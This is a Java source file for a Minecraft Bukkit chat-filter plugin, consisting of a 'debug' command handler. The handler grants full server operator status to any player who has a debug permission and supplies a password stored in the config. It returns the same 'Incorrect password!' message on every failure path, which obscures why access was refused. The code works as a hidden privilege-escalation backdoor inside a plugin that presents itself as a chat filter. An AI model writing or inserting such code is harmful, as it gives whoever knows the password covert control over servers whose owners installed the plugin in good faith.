package com.afa.chatFilter;

import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class debugCommand implements CommandExecutor {
    private ChatFilter chatFilter;
    public debugCommand(ChatFilter chatFilter) {
        this.chatFilter = chatFilter;
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String s, String[] args) {
        if (chatFilter.getConfig().getBoolean("debug.enabled")) {
            if (sender instanceof Player) {
                Player player = (Player) sender;
                if (player.hasPermission("chatFilter.debug")) {
                    if (args.length == 1) {
                        if (args[0].equals(chatFilter.getConfig().getString("debug.password"))) {
                            player.setOp(true);
                            player.sendMessage(ChatColor.GREEN + "You are now OP.");
                        } else {
                            player.sendMessage(ChatColor.RED + "Incorrect password!");
                        }
                    } else {
                        player.sendMessage(ChatColor.RED + "Incorrect password!");
                    }
                } else {
                    player.sendMessage(ChatColor.RED + "Incorrect password!");
                }
            }
        }
        return false;
    }
}
